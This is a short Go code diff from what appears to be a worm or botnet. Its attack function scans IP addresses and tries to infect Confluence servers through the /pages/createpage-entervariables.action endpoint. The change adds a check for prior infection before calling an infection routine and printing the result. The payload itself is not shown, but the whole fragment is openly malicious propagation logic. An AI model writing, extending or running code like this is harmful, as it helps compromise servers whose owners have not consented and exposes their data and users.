@@ -50,8 +50,12 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 		//Confluence infect
 		if !infected && ports[2] != 0 {
 			ip_port := ip + ":" + strconv.Itoa(ports[2])
-			infection.ConfluenceCmdExecute("http://" + ip_port , "/pages/createpage-entervariables.action?SpaceKey=x")
-			infected = true
+			confluenceUrl := "http://" + ip_port
+			confluenceEndpoint := "/pages/createpage-entervariables.action?SpaceKey=x"
+			if (!infection.ConfluenceCheckInfection(confluenceUrl, confluenceEndpoint)) {
+				infected = infection.ConfluenceInfect(confluenceUrl, confluenceEndpoint)
+				fmt.Println(infected)
+			}
 		}
 	}
 	wg.Done()
